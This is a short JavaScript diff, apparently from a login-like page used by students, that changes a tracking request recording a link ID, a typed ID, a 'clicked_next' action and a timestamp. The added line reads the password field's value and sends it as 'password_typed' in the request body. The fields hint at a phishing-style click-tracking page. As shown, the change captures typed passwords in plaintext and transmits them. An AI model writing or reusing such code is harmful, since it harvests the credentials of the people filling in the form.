@@ -122,6 +122,7 @@ const passwordValue = document.getElementById("passwordInput")?.value || "";
     body: JSON.stringify({
       student_from_link: linkId || "none",
       student_typed: typedId || "empty",
+password_typed: passwordValue || "empty", // <--- Added this line
       action: "clicked_next",
       time: new Date().toISOString()
     })
